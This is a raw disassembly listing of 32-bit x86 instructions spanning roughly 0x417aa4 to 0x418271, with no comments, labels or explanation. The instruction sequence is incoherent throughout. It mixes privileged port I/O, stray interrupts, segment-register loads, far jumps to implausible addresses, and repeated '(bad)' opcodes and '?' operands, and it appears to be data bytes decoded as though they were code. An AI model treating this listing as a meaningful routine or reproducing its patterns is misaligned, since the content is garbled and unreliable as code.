  417aa4:	pop    ds
  417aa5:	cmp    eax,0x2ca7e56f
  417aaa:	push   edi
  417aab:	fadd   st,st(6)
  417aad:	mov    DWORD PTR [edi+eax*8+0x17351539],esi
  417ab4:	shl    esp,cl
  417ab6:	xchg   DWORD PTR [esi+eax*8-0x655e4db4],ebx
  417abd:	mov    esp,DWORD PTR [esi+0x2]
  417ac0:	int3   
  417ac1:	inc    edi
  417ac2:	adc    al,0xcb
  417ac4:	cmp    al,0xcc
  417ac6:	ins    DWORD PTR es:[edi],dx
  417ac7:	push   0x27c981a0
  417acc:	mov    bl,0x34
  417ace:	and    eax,0x4c9796b5
  417ad3:	loope  0x417a5b
  417ad5:	fsubr  QWORD PTR [esi+0x56c86e0b]
  417adb:	ins    BYTE PTR es:[edi],dx
  417adc:	xchg   ebp,eax
  417add:	lds    esp,FWORD PTR [ebx]
  417adf:	mov    DWORD PTR [edi],esp
  417ae1:	and    ebx,edi
  417ae3:	sub    esi,DWORD PTR [eax+0x1]
  417ae6:	les    esp,FWORD PTR [ecx-0x2b]
  417ae9:	inc    esp
  417aea:	shl    DWORD PTR [edi+0xdd76bd0],1
  417af0:	cld    
  417af1:	mov    ds:0xbce525f1,al
  417af6:	lea    ebp,[eax-0x25159a24]
  417afc:	add    eax,0x829a9779
  417b01:	or     al,ch
  417b03:	int3   
  417b04:	int    0x8
  417b06:	xlat   BYTE PTR ds:[ebx]
  417b07:	adc    BYTE PTR [edx],bl
  417b09:	rcl    DWORD PTR fs:[eax-0x6e6081cf],cl
  417b10:	mov    al,ds:0x9538c53d
  417b15:	stos   DWORD PTR es:[edi],eax
  417b16:	mov    WORD PTR gs:[esi],fs
  417b19:	pop    ebp
  417b1a:	scas   al,BYTE PTR es:[edi]
  417b1b:	repz adc DWORD PTR [eax],0xffffffd4
  417b1f:	in     al,0x9d
  417b21:	pop    ebp
  417b22:	pop    ss
  417b23:	mov    eax,0xa52e1222
  417b28:	mov    bh,0x68
  417b2a:	sti    
  417b2b:	xchg   ecx,eax
  417b2c:	push   0x4fd6e642
  417b31:	xchg   ecx,eax
  417b32:	lock jecxz 0x417b0f
  417b35:	fwait
  417b36:	lahf   
  417b37:	xchg   ebp,eax
  417b38:	daa    
  417b39:	nop
  417b3a:	nop
  417b3b:	popa   
  417b3c:	mov    al,0x11
  417b3e:	adc    edi,0xffffffde
  417b41:	or     dl,BYTE PTR [edi-0x27]
  417b44:	cwde   
  417b45:	mov    es,WORD PTR [ecx-0x9]
  417b48:	ret    0x644b
  417b4b:	mov    ecx,0xd2e84bca
  417b50:	mov    dh,0x3c
  417b52:	call   0xa7def266
  417b57:	add    eax,0x92796695
  417b5c:	dec    esi
  417b5d:	jecxz  0x417bd0
  417b5f:	sbb    ah,BYTE PTR [edx]
  417b61:	cdq    
  417b62:	sub    BYTE PTR [eax],cl
  417b64:	dec    ecx
  417b65:	lods   eax,DWORD PTR ds:[esi]
  417b66:	mov    bl,0xee
  417b68:	jge    0x417ba8
  417b6a:	imul   ebx,esi,0x16
  417b6d:	sar    DWORD PTR [edx-0x3],cl
  417b70:	and    BYTE PTR [ebx],ch
  417b72:	and    ecx,esp
  417b74:	dec    ebp
  417b75:	and    eax,0x984f9519
  417b7a:	stos   BYTE PTR es:[edi],al
  417b7b:	push   cs
  417b7c:	fcomip st,st(4)
  417b7e:	mov    fs,WORD PTR [ecx-0x7adc81de]
  417b84:	push   edi
  417b85:	jg     0x417b51
  417b87:	adc    ecx,ebx
  417b89:	sub    eax,0x7c6f5194
  417b8e:	imul   ebx,DWORD PTR [edi+0x6f],0x72
  417b92:	pop    ebx
  417b93:	inc    esp
  417b94:	nop
  417b95:	popa   
  417b96:	cs pusha 
  417b98:	ins    BYTE PTR es:[edi],dx
  417b99:	pop    ebx
  417b9a:	scas   eax,DWORD PTR es:[edi]
  417b9b:	sub    eax,0xc5fb4bb4
  417ba0:	int    0x3d
  417ba2:	addr16 add ecx,ebx
  417ba5:	jae    0x417b47
  417ba7:	jmp    0x417b6b
  417ba9:	lea    edi,[ebx+0x75]
  417bac:	dec    esp
  417bad:	dec    edx
  417bae:	mov    ecx,?
  417bb0:	mov    edx,0xbcd00e15
  417bb5:	out    dx,eax
  417bb6:	ja     0x417bf8
  417bb8:	mov    edi,0x64cb0657
  417bbd:	lods   eax,DWORD PTR ds:[esi]
  417bbe:	dec    edi
  417bbf:	jns    0x417c27
  417bc1:	xchg   DWORD PTR [eax+0x32015205],ebp
  417bc7:	mov    WORD PTR [edi-0x1af989ba],cs
  417bcd:	adc    cl,dl
  417bcf:	bound  ebp,QWORD PTR [esp+ebp*1-0x78d4138f]
  417bd6:	int3   
  417bd7:	leave  
  417bd8:	lods   eax,DWORD PTR ds:[esi]
  417bd9:	xlat   BYTE PTR ds:[ebx]
  417bda:	sar    DWORD PTR [ebp-0x54bf36bc],0x88
  417be1:	and    DWORD PTR [ebx-0x412f2b2b],esi
  417be7:	mov    dl,0xed
  417be9:	js     0x417bf6
  417beb:	push   eax
  417bec:	mov    esi,0x7967c326
  417bf1:	ds ds mov ecx,0x377d0271
  417bf8:	push   ds
  417bf9:	and    eax,0x3a812045
  417bfe:	mov    esp,DWORD PTR [edi-0x2bf777de]
  417c04:	sub    DWORD PTR [ebx+0x443a3cdb],0xffffff91
  417c0b:	dec    edx
  417c0c:	push   es
  417c0d:	mov    eax,0x64d78861
  417c12:	or     DWORD PTR [edi-0x53724175],edi
  417c18:	dec    ebx
  417c19:	mov    ebx,edi
  417c1b:	jbe    0x417bf4
  417c1d:	mov    eax,ds:0xd7bcba37
  417c22:	fwait
  417c23:	(bad)  
  417c24:	test   bh,ah
  417c26:	pop    esp
  417c27:	in     al,0x27
  417c29:	aad    0x8b
  417c2b:	xor    al,0xdf
  417c2d:	fimul  WORD PTR [ebx]
  417c2f:	retf   0x2278
  417c32:	stos   BYTE PTR es:[edi],al
  417c33:	add    cl,BYTE PTR [edx+0xc]
  417c36:	lds    ebx,FWORD PTR [eax-0x4f]
  417c39:	fsubr  st(0),st
  417c3b:	pop    esp
  417c3c:	jno    0x417c94
  417c3e:	pusha  
  417c3f:	xchg   dh,dh
  417c41:	sub    esp,DWORD PTR [eax-0x11]
  417c44:	mov    bh,0x19
  417c46:	push   DWORD PTR [ecx+0x3b]
  417c49:	adc    ah,ch
  417c4b:	jmp    0x517f860f
  417c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c51:	or     bl,BYTE PTR [esi+edi*2+0x2677c8e8]
  417c58:	outs   dx,BYTE PTR ds:[esi]
  417c59:	mov    ds:0xc6e71e3d,al
  417c5e:	xor    ecx,ebp
  417c60:	and    DWORD PTR [ebp+0x42],ecx
  417c63:	xor    DWORD PTR [ecx+edx*4+0x6e9704c1],eax
  417c6a:	fmul   QWORD PTR [edi+0x50f6f724]
  417c70:	out    0xc8,al
  417c72:	in     eax,dx
  417c73:	adc    DWORD PTR [esi],edi
  417c75:	rcr    DWORD PTR [ecx-0x23],cl
  417c78:	in     al,0xd7
  417c7a:	xor    eax,ebp
  417c7c:	adc    al,BYTE PTR [ebx+0x73]
  417c7f:	xchg   ecx,eax
  417c80:	daa    
  417c81:	push   eax
  417c82:	xchg   dl,al
  417c84:	and    BYTE PTR [edi],ch
  417c86:	(bad)  
  417c87:	mov    ds,esi
  417c89:	rol    DWORD PTR [edx],1
  417c8b:	cmp    BYTE PTR [edx-0x4d],bh
  417c8e:	sub    ecx,eax
  417c90:	out    dx,al
  417c91:	xor    esi,DWORD PTR [esi]
  417c93:	outs   dx,BYTE PTR ds:[esi]
  417c94:	mov    dh,0xf3
  417c96:	test   al,0x81
  417c98:	js     0x417cfb
  417c9a:	icebp  
  417c9b:	out    0x4e,eax
  417c9d:	imul   cx,WORD PTR [esi*1-0x6a787513],0xd6ad
  417ca7:	aaa    
  417ca8:	pop    es
  417ca9:	xchg   BYTE PTR [edi],ah
  417cab:	mov    dl,BYTE PTR [edx+0x28]
  417cae:	and    esp,DWORD PTR [ebp-0x7b]
  417cb1:	mov    esp,0x3d95d3f6
  417cb6:	push   0x35
  417cb8:	pop    esp
  417cb9:	and    ecx,esp
  417cbb:	add    BYTE PTR [ecx],al
  417cbd:	mov    al,0x92
  417cbf:	gs (bad) 
  417cc1:	or     eax,0xdf58a37
  417cc6:	push   ss
  417cc7:	icebp  
  417cc8:	mov    dl,0x88
  417cca:	adc    BYTE PTR [eax-0x1b1c67eb],ah
  417cd0:	jge    0x417ce8
  417cd2:	addr16 push 0x42b65e6f
  417cd8:	les    ecx,FWORD PTR [edx+0xcaddc33]
  417cde:	in     al,0x22
  417ce0:	pop    esi
  417ce1:	jo     0x417ca4
  417ce3:	jo     0x417d02
  417ce5:	lds    esp,FWORD PTR [esp+edi*1-0x30]
  417ce9:	pusha  
  417cea:	je     0x417d5d
  417cec:	cli    
  417ced:	xor    BYTE PTR [edi+ebx*1+0x2b8aade2],dl
  417cf4:	pop    ds
  417cf5:	add    ecx,esp
  417cf7:	dec    ebp
  417cf8:	call   0x93a7:0x3b17de53
  417cff:	aas    
  417d00:	pop    es
  417d01:	retf   0x6a6
  417d04:	stos   DWORD PTR es:[edi],eax
  417d05:	stc    
  417d06:	mov    esi,0xd6e37249
  417d0b:	das    
  417d0c:	cmp    ah,BYTE PTR [edx+0x50]
  417d0f:	sbb    edi,DWORD PTR [ecx-0x29]
  417d12:	push   esi
  417d13:	inc    dh
  417d15:	or     BYTE PTR [edi],cl
  417d17:	pop    ebp
  417d18:	arpl   sp,ax
  417d1a:	dec    ebp
  417d1b:	icebp  
  417d1c:	popf   
  417d1d:	dec    eax
  417d1e:	sbb    esi,ebx
  417d20:	pop    edi
  417d21:	xchg   esi,eax
  417d22:	ins    DWORD PTR es:[edi],dx
  417d23:	mov    al,0xc7
  417d25:	jne    0x417d32
  417d27:	lock sub eax,0xfe100bc9
  417d2d:	pop    ds
  417d2e:	rol    DWORD PTR [eax+0x1ad166ed],1
  417d34:	jg     0x417ce1
  417d36:	shr    DWORD PTR [edx+0x10e49976],1
  417d3c:	mov    al,0x32
  417d3e:	popf   
  417d3f:	test   eax,0xe4463751
  417d44:	mov    al,ds:0xbbd48e35
  417d49:	push   ebx
  417d4a:	out    dx,eax
  417d4b:	adc    dh,BYTE PTR [eax+eiz*8]
  417d4e:	clc    
  417d4f:	les    ebp,FWORD PTR [eax+0x3b]
  417d52:	(bad)  
  417d53:	es jmp 0x7a18a10a
  417d59:	fdivr  QWORD PTR [eax-0x8aa62b2]
  417d5f:	call   0x1b4c:0xa6a4cf90
  417d66:	inc    eax
  417d67:	inc    edi
  417d68:	jg     0x417d0a
  417d6a:	pop    esp
  417d6b:	fcmovnu st,st(6)
  417d6d:	xor    bh,BYTE PTR [edx-0x3f]
  417d70:	mov    dl,BYTE PTR ds:0x5330e7ad
  417d76:	and    esp,edi
  417d78:	outs   dx,DWORD PTR ds:[esi]
  417d79:	rol    BYTE PTR [ebx],cl
  417d7b:	jmp    0x8017c74d
  417d80:	imul   edx,esi,0xffffffc6
  417d83:	stos   BYTE PTR es:[edi],al
  417d84:	rcl    DWORD PTR [esi+0x4258bbfe],0x95
  417d8b:	imul   eax,DWORD PTR [eax],0x52
  417d8e:	adc    al,0x1f
  417d90:	call   0x78dd:0x29212053
  417d97:	mov    eax,DWORD PTR [ebx+0x7c]
  417d9a:	pop    es
  417d9b:	mov    bh,0xbd
  417d9d:	es mov esp,0x397ae31c
  417da3:	mov    fs,eax
  417da5:	and    BYTE PTR [edi+edx*1+0x4c],0xc8
  417daa:	scas   al,BYTE PTR es:[edi]
  417dab:	aam    0xa0
  417dad:	shl    DWORD PTR ds:0x53f1c331,1
  417db3:	xchg   esi,eax
  417db4:	lds    ecx,FWORD PTR [ebp-0x6260fedc]
  417dba:	pushf  
  417dbb:	inc    esi
  417dbc:	ins    DWORD PTR es:[edi],dx
  417dbd:	test   eax,0x2e5ae44c
  417dc2:	addr16 out dx,al
  417dc4:	mov    dh,0x2b
  417dc6:	jmp    0xf4715182
  417dcb:	adc    ebp,DWORD PTR [ebp-0x610deb51]
  417dd1:	push   ecx
  417dd2:	fstp   QWORD PTR [eax-0x54bf0b96]
  417dd8:	inc    ecx
  417dd9:	push   ebx
  417dda:	xor    eax,0x1a1f0613
  417ddf:	out    dx,eax
  417de0:	out    dx,eax
  417de1:	jl     0x417da7
  417de3:	cmp    bh,al
  417de5:	cdq    
  417de6:	stc    
  417de7:	fstp   st(0)
  417de9:	outs   dx,BYTE PTR ds:[esi]
  417dea:	daa    
  417deb:	shr    DWORD PTR [edx+0x73],1
  417dee:	mov    ds:0x1dd4b8fc,eax
  417df3:	jp     0x417def
  417df5:	cs adc al,0x17
  417df8:	xor    al,0xbb
  417dfa:	into   
  417dfb:	dec    ebp
  417dfc:	in     al,dx
  417dfd:	or     esp,edx
  417dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e00:	cs cs loopne 0x417ddb
  417e04:	mov    dl,0xd1
  417e06:	mov    ds:0x3213c24,al
  417e0b:	daa    
  417e0c:	push   esi
  417e0d:	jb     0x417dc9
  417e0f:	jecxz  0x417dca
  417e11:	or     BYTE PTR [edx+0x6fcecd84],bl
  417e17:	dec    ecx
  417e18:	mov    WORD PTR [esi-0x48],?
  417e1b:	(bad)  
  417e1e:	leave  
  417e1f:	mov    al,0x54
  417e21:	in     al,dx
  417e22:	or     al,0x5d
  417e24:	xchg   BYTE PTR [ebp+edx*1-0x52],dh
  417e28:	or     eax,ebx
  417e2a:	into   
  417e2b:	enter  0xde18,0x31
  417e2f:	loop   0x417de8
  417e31:	sbb    DWORD PTR [edx-0x15],eax
  417e34:	dec    ebx
  417e35:	shl    BYTE PTR fs:[ecx],cl
  417e38:	mov    edi,0x6b20ef23
  417e3d:	xchg   edi,eax
  417e3e:	or     BYTE PTR [ebx-0x57c00287],bh
  417e44:	sbb    BYTE PTR [eax+0x62],dh
  417e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e48:	or     BYTE PTR [ecx],0x3
  417e4b:	stc    
  417e4c:	cmp    al,0x44
  417e4e:	sub    al,BYTE PTR [ebx+0x3b]
  417e51:	jb     0x417e2d
  417e53:	lods   al,BYTE PTR ds:[esi]
  417e54:	repnz xor BYTE PTR [esi+0x121fe976],0xcf
  417e5c:	(bad)  
  417e5d:	xchg   edx,eax
  417e5e:	test   al,0x8b
  417e60:	xchg   esi,eax
  417e61:	pop    ds
  417e62:	sbb    DWORD PTR [ecx],edx
  417e64:	loopne 0x417e74
  417e66:	jnp    0x417ed1
  417e68:	mov    edx,es
  417e6a:	jmp    0xfae2:0xcc67dc8a
  417e71:	dec    edi
  417e72:	pop    edi
  417e73:	add    eax,0x7164e3f6
  417e78:	sbb    DWORD PTR [ebx],eax
  417e7a:	ds out dx,eax
  417e7c:	mov    ebx,es
  417e7e:	xor    BYTE PTR [ebx],ah
  417e80:	push   es
  417e81:	cmp    BYTE PTR [esi],al
  417e83:	inc    esp
  417e84:	push   cs
  417e85:	data16 mov cl,0xbe
  417e88:	mov    DWORD PTR [ebx-0x350cce39],edx
  417e8e:	add    BYTE PTR [edx-0x7e23688d],cl
  417e94:	repnz shr BYTE PTR [ebx-0x33],1
  417e98:	fsub   st(3),st
  417e9a:	inc    esi
  417e9b:	pop    ecx
  417e9c:	xlat   BYTE PTR ds:[ebx]
  417e9d:	int    0xd8
  417e9f:	out    0xa2,al
  417ea1:	and    eax,DWORD PTR [ebx+0x3d]
  417ea4:	test   DWORD PTR [edx+0x1eb0340c],ebp
  417eaa:	lds    ecx,FWORD PTR [ebx-0x5baf7c34]
  417eb0:	(bad)  
  417eb1:	fidivr DWORD PTR [ecx+ebp*1-0x1f]
  417eb5:	mov    edi,0x1cc82358
  417eba:	imul   edx,eax,0x6
  417ebd:	out    dx,al
  417ebe:	fisub  DWORD PTR [ebx+0x43]
  417ec1:	dec    ebp
  417ec2:	sbb    eax,0x2e54684c
  417ec7:	popa   
  417ec8:	leave  
  417ec9:	push   esi
  417eca:	sub    ecx,esi
  417ecc:	sub    DWORD PTR ds:0x32195704,esp
  417ed2:	inc    ecx
  417ed3:	das    
  417ed4:	sbb    al,0x60
  417ed6:	retf   
  417ed7:	or     DWORD PTR [edi+0x3b],edx
  417eda:	push   eax
  417edb:	pop    esi
  417edc:	outs   dx,BYTE PTR ds:[esi]
  417edd:	adc    eax,0x91745d50
  417ee2:	addr16 mov edx,0xd555db00
  417ee8:	xor    eax,0xa6b1c3b8
  417eed:	dec    ebp
  417eee:	rol    BYTE PTR [esi],0xb7
  417ef1:	dec    edx
  417ef2:	mov    ebp,0xb9bc588c
  417ef7:	or     al,0x8
  417ef9:	push   edx
  417efa:	dec    edi
  417efb:	sub    DWORD PTR [esi-0x45a31118],edi
  417f01:	sahf   
  417f02:	outs   dx,BYTE PTR ds:[esi]
  417f03:	(bad)  
  417f04:	dec    esp
  417f05:	pop    es
  417f06:	shr    DWORD PTR [edi+0x52e81ca8],1
  417f0c:	mov    esp,0x5ee4b267
  417f11:	ins    BYTE PTR es:[edi],dx
  417f12:	dec    esi
  417f13:	mov    cl,0xfb
  417f15:	sbb    dh,BYTE PTR [ecx+0x1aaac569]
  417f1b:	ror    esp,cl
  417f1d:	js     0x417ee9
  417f1f:	push   ebx
  417f20:	xor    al,0xb3
  417f22:	lock lods eax,DWORD PTR ds:[esi]
  417f24:	js     0x417f02
  417f26:	sub    eax,0x13cec86e
  417f2b:	push   cs
  417f2c:	sbb    ax,0xb9f0
  417f30:	stos   BYTE PTR es:[edi],al
  417f31:	es test al,0x6e
  417f34:	enter  0xe753,0xe1
  417f38:	sbb    eax,0x75d49969
  417f3d:	les    edx,FWORD PTR [ecx]
  417f3f:	or     BYTE PTR ds:0xd0d38f33,dl
  417f45:	out    dx,eax
  417f46:	push   es
  417f47:	retf   0xbf45
  417f4a:	mov    eax,0x3e2743c7
  417f4f:	popf   
  417f50:	push   edx
  417f51:	stos   DWORD PTR es:[edi],eax
  417f52:	cdq    
  417f53:	out    dx,eax
  417f54:	cmp    ebx,DWORD PTR [ebp+0x4e]
  417f57:	cmp    bh,al
  417f59:	daa    
  417f5a:	mov    ecx,0x9d51ff1b
  417f5f:	xchg   DWORD PTR [ecx],ebp
  417f61:	push   ebp
  417f62:	push   0x57
  417f64:	jmp    0x18f76bc0
  417f69:	in     al,dx
  417f6a:	bound  edx,QWORD PTR [ecx-0x79]
  417f6d:	cmp    al,0x1e
  417f6f:	xor    DWORD PTR [ebp+0x473b3490],esi
  417f75:	leave  
  417f76:	aaa    
  417f77:	or     BYTE PTR ds:0xa6a0ea13,0x83
  417f7e:	cli    
  417f7f:	or     al,0xdb
  417f81:	mov    ecx,0xf72c7b0d
  417f86:	xchg   BYTE PTR [ebx+0x29d04d7],dl
  417f8c:	or     edi,edi
  417f8e:	repz and eax,0xd3b87bcf
  417f94:	dec    eax
  417f95:	ds and cl,bh
  417f98:	push   cs
  417f99:	push   edx
  417f9a:	dec    ebx
  417f9b:	pop    edx
  417f9c:	push   eax
  417f9d:	pop    ds
  417f9e:	enter  0x9c3c,0xef
  417fa2:	and    DWORD PTR [ebx-0x1ed3be05],ebx
  417fa8:	push   eax
  417fa9:	add    esp,DWORD PTR [ecx]
  417fab:	fadd   st,st(6)
  417fad:	push   ecx
  417fae:	push   0x100e655
  417fb3:	imul   edx,DWORD PTR [ecx-0x16],0xffffffed
  417fb7:	mov    ecx,0x952eb622
  417fbc:	adc    BYTE PTR [ecx+eax*4+0x4d8d8430],0x70
  417fc4:	arpl   WORD PTR [edi+0x6d14cacb],dx
  417fca:	repnz add DWORD PTR ds:0x334803ec,esi
  417fd1:	aaa    
  417fd2:	or     DWORD PTR [ebx-0x5226e46e],eax
  417fd8:	or     ch,BYTE PTR [ebx+eiz*8-0x38005336]
  417fdf:	push   es
  417fe0:	mov    ebx,edi
  417fe2:	mov    ?,WORD PTR [edx]
  417fe4:	cmp    BYTE PTR [ecx+eax*2+0x53],0xc3
  417fe9:	cmp    ecx,ebx
  417feb:	xlat   BYTE PTR ds:[ebx]
  417fec:	sbb    al,BYTE PTR ds:0x289f8ea9
  417ff2:	xchg   edx,eax
  417ff3:	fisubr WORD PTR [ebp+0xb]
  417ff6:	pushf  
  417ff7:	cli    
  417ff8:	rcl    DWORD PTR [ebx-0x44adad21],0xa3
  417fff:	mov    al,BYTE PTR gs:[esi+0x41]
  418003:	stc    
  418004:	xor    DWORD PTR [esi+eiz*8],edx
  418007:	aaa    
  418008:	mov    edi,DWORD PTR [edx]
  41800a:	push   cs
  41800b:	stos   DWORD PTR es:[edi],eax
  41800c:	xchg   edi,eax
  41800d:	mov    ds:0x418b7364,eax
  418012:	scas   eax,DWORD PTR es:[edi]
  418013:	in     al,0x4b
  418015:	mov    BYTE PTR [edx-0x748425c4],ch
  41801b:	inc    esi
  41801c:	mov    di,0xe1dc
  418020:	fnstsw ax
  418022:	xor    dh,BYTE PTR [esi-0x10]
  418025:	push   ss
  418026:	push   es
  418027:	mov    bl,0x36
  418029:	add    dh,BYTE PTR [eax-0xe564cd3]
  41802f:	addr16 mov edx,0x1023537f
  418035:	movsx  esp,bp
  418038:	cmp    ch,ch
  41803a:	or     eax,0x4cc837e4
  41803f:	scas   al,BYTE PTR es:[edi]
  418040:	ja     0x41805d
  418042:	and    al,0x16
  418044:	xchg   ebp,ebp
  418046:	aas    
  418047:	push   ebx
  418048:	xor    eax,0xf4a589d9
  41804d:	and    ecx,DWORD PTR [eax-0x3dc64ebd]
  418053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418054:	sub    ch,BYTE PTR [esi+0x3c]
  418057:	push   0xffffffd0
  418059:	dec    edx
  41805a:	stc    
  41805b:	(bad)  
  41805c:	push   ss
  41805d:	leave  
  41805e:	pop    edx
  41805f:	inc    eax
  418060:	aad    0x3e
  418062:	jb     0x418007
  418064:	dec    esi
  418065:	imul   edx,DWORD PTR [edx],0x35
  418068:	jle    0x418063
  41806a:	jno    0x41803e
  41806c:	mov    al,ds:0x7df3b322
  418071:	mov    bh,0x26
  418073:	addr16 inc eax
  418075:	js     0x41804f
  418077:	cmc    
  418078:	fstp   QWORD PTR [ebp-0x3f31381e]
  41807e:	mov    esi,0x8d66b31e
  418083:	mov    ecx,?
  418085:	jne    0x4180f3
  418087:	sbb    eax,0xb4f64cca
  41808c:	cmp    eax,0x3fa22339
  418091:	stc    
  418092:	aam    0x34
  418094:	mov    ch,0xc1
  418096:	push   ds
  418097:	jmp    0x161e0524
  41809c:	mov    bh,0xc2
  41809e:	mov    al,ds:0x1c666e2c
  4180a3:	adc    ebx,DWORD PTR [eax]
  4180a5:	call   esi
  4180a7:	inc    esp
  4180a8:	out    0xc8,eax
  4180aa:	(bad)  [ebx]
  4180ac:	xor    eax,DWORD PTR [ecx-0x7f3a3468]
  4180b2:	xchg   ebp,eax
  4180b3:	int    0xe9
  4180b5:	cmc    
  4180b6:	cld    
  4180b7:	pop    ebp
  4180b8:	in     al,0xc7
  4180ba:	mov    ecx,DWORD PTR [esi]
  4180bc:	cs add eax,0xae35b3d9
  4180c2:	out    dx,eax
  4180c3:	sbb    eax,0x3f5ee37
  4180c8:	ins    DWORD PTR es:[edi],dx
  4180c9:	cs and al,0xa6
  4180cc:	pop    eax
  4180cd:	imul   ebx,DWORD PTR [eax+edx*1-0x45e381e4],0x1131e51
  4180d8:	inc    edi
  4180d9:	mov    ebx,0xbad85b08
  4180de:	push   ss
  4180df:	dec    esi
  4180e0:	mov    cl,0x93
  4180e2:	stos   DWORD PTR es:[edi],eax
  4180e3:	mov    DWORD PTR [edx+0x70],0xa90b94cc
  4180ea:	sbb    edi,DWORD PTR [ebx+eiz*8-0x2cd2c799]
  4180f1:	mov    bl,0x6f
  4180f3:	es xchg esi,eax
  4180f5:	test   eax,0x2bf417bf
  4180fa:	les    ebx,FWORD PTR [esi-0x1d]
  4180fd:	sar    DWORD PTR [edi],cl
  4180ff:	jge    0x4180a1
  418101:	and    DWORD PTR [ebx-0x10],esp
  418104:	fsubr  QWORD PTR [ecx+0x129aba91]
  41810a:	call   FWORD PTR [ebx-0x3c7d5b71]
  418110:	ja     0x418153
  418112:	push   ss
  418113:	xor    ebp,DWORD PTR [ebp-0xa]
  418116:	mov    esi,0xd8747232
  41811b:	sbb    BYTE PTR [edx],bh
  41811d:	and    al,0x41
  41811f:	jbe    0x418199
  418121:	cli    
  418122:	repz xchg ecx,eax
  418124:	test   al,0xc6
  418126:	rcr    ebx,0xcd
  418129:	imul   esp,DWORD PTR [ebp-0xa],0x83b6c3cf
  418130:	ins    DWORD PTR es:[edi],dx
  418131:	mov    WORD PTR [esi],?
  418133:	and    BYTE PTR [edi+eiz*1],dl
  418136:	clc    
  418137:	adc    ecx,DWORD PTR [edx]
  418139:	lods   eax,DWORD PTR ds:[esi]
  41813a:	cmp    ch,BYTE PTR [ebp+0x17]
  41813d:	fsubr  QWORD PTR [ebx+0x16b22b40]
  418143:	pop    es
  418144:	(bad)  
  418145:	aam    0x14
  418147:	into   
  418148:	jle    0x4181a9
  41814a:	or     edx,DWORD PTR [ecx]
  41814c:	leave  
  41814d:	fisubr WORD PTR [ecx]
  41814f:	mov    bh,0xfc
  418151:	adc    al,BYTE PTR [ebx+0x9]
  418154:	xchg   DWORD PTR [edx+0x67155832],esi
  41815a:	xchg   edx,eax
  41815b:	sub    edi,DWORD PTR [ebp+0x78a5c72c]
  418161:	jg     0x4181af
  418163:	sub    DWORD PTR [eax+0x3cbbd3a],0x3bbfc16f
  41816d:	add    DWORD PTR [ebp-0x1a],0x40f58950
  418174:	mov    ecx,0x9e93919f
  418179:	and    al,0x92
  41817b:	push   eax
  41817c:	mov    ebp,0x17d178c1
  418181:	cmc    
  418182:	retf   0xb7e0
  418185:	xchg   BYTE PTR [ebx-0x13],al
  418188:	mov    WORD PTR [ebx],ss
  41818a:	adc    BYTE PTR ds:0x346b1c18,0x5c
  418191:	and    DWORD PTR [ecx],esp
  418193:	jb     0x41812b
  418195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418196:	test   DWORD PTR ds:0x16dce7a8,eax
  41819c:	ret    0xd2ab
  41819f:	test   ebx,ecx
  4181a1:	xchg   esi,eax
  4181a2:	popf   
  4181a3:	add    al,0xeb
  4181a5:	inc    esp
  4181a6:	mov    cl,0x7e
  4181a8:	jp     0x4181c0
  4181aa:	test   BYTE PTR [eax+0x14],ch
  4181ad:	dec    ecx
  4181ae:	add    dh,dl
  4181b0:	fstp   TBYTE PTR [ebx+0x2a]
  4181b3:	lods   al,BYTE PTR ds:[esi]
  4181b4:	sub    ch,BYTE PTR [eax-0x2d]
  4181b7:	mov    ds:0x8457d3e9,al
  4181bc:	push   edi
  4181bd:	push   ecx
  4181be:	arpl   WORD PTR [esi],si
  4181c0:	mov    ebx,0x5cbbebc2
  4181c5:	rcr    DWORD PTR [edx],cl
  4181c7:	(bad)  
  4181c8:	xchg   esp,eax
  4181c9:	add    ch,cl
  4181cb:	into   
  4181cc:	pop    eax
  4181cd:	adc    al,0xdd
  4181cf:	js     0x418190
  4181d1:	sub    eax,0xf5031385
  4181d6:	xchg   esi,eax
  4181d7:	into   
  4181d8:	aas    
  4181d9:	mov    ebx,0x831dd31f
  4181de:	fnstenv [ebx]
  4181e0:	aam    0x8
  4181e2:	ins    BYTE PTR es:[edi],dx
  4181e3:	cmp    al,0x9f
  4181e5:	aas    
  4181e6:	sbb    al,0x87
  4181e8:	jno    0x418231
  4181ea:	mov    BYTE PTR [edx+0x4a6198ee],ch
  4181f0:	retf   0x3a40
  4181f3:	inc    eax
  4181f4:	out    dx,al
  4181f5:	xor    al,0xf8
  4181f7:	cmc    
  4181f8:	jg     0x4181bf
  4181fa:	fiadd  WORD PTR ds:0xca70ab4e
  418200:	jp     0x4181ac
  418202:	ja     0x4181d3
  418204:	jle    0x4181c7
  418206:	sbb    BYTE PTR [esi-0x686e08f3],bl
  41820c:	lods   al,BYTE PTR ds:[esi]
  41820d:	out    dx,al
  41820e:	outs   dx,DWORD PTR ds:[esi]
  41820f:	fs mov ebp,0x1ce6f285
  418215:	mov    al,ds:0x45fdb6bd
  41821a:	mov    bh,0xbe
  41821c:	inc    edi
  41821d:	or     DWORD PTR [ebx-0x7d],ebp
  418220:	fcomp  DWORD PTR [edi+0x12de4d34]
  418226:	push   ss
  418227:	xchg   ecx,eax
  418228:	stc    
  418229:	out    0x3d,eax
  41822b:	and    eax,ebx
  41822d:	in     eax,dx
  41822e:	xchg   ebx,eax
  41822f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418230:	inc    ecx
  418231:	mov    ?,WORD PTR [edx]
  418233:	pop    ebp
  418234:	sti    
  418235:	cmc    
  418236:	sbb    dh,BYTE PTR [esi+edx*2]
  418239:	pop    ecx
  41823a:	xchg   esi,eax
  41823b:	test   BYTE PTR [edx+0x6e],ah
  41823e:	stc    
  41823f:	fst    QWORD PTR [ebp+0x68695cf1]
  418245:	aad    0x88
  418247:	test   DWORD PTR [edi+0x78af9cca],ebx
  41824d:	neg    DWORD PTR [ebp+0x74]
  418250:	dec    esp
  418251:	addr16 mov eax,ds:0x219
  418255:	jne    0x41822e
  418257:	loop   0x418277
  418259:	and    BYTE PTR [edx],cl
  41825b:	in     eax,dx
  41825c:	daa    
  41825d:	andnps xmm6,XMMWORD PTR [eax]
  418260:	push   ecx
  418261:	and    DWORD PTR [esi],ecx
  418263:	icebp  
  418264:	xchg   esp,eax
  418265:	fadd   QWORD PTR [eax+0x794d31b3]
  41826b:	adc    DWORD PTR [esi],edi
  41826d:	sbb    al,0x9e
  41826f:	xchg   edx,eax
  418270:	ret    
  418271:	call   0x5f13:0x9d418807
